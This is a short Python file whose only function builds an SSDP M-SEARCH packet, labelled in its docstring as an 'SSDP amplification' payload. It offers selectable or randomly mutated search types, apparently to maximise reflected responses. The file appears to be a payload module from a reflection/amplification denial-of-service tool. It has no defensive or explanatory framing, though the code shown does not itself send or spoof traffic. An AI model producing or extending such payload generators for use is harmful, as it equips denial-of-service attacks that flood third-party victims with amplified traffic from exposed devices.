import random

def generate_payload(target, options=None):
    """
    SSDP amplification, supports multiple ST types/mutation
    options:
      - st: str, search type (ssdp:all/roku:ecp/etc)
      - mutate: bool, whether to mutate
    """
    st = options.get('st', 'ssdp:all') if options else 'ssdp:all'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        st = random.choice(['ssdp:all','upnp:rootdevice','roku:ecp','urn:schemas-upnp-org:device:MediaServer:1'])
    return (b'M-SEARCH * HTTP/1.1\r\n' +
            b'HOST:239.255.255.250:1900\r\n' +
            f'ST: {st}\r\n'.encode() +
            b'MAN: "ssdp:discover"\r\n' +
            b'MX: 3\r\n\r\n')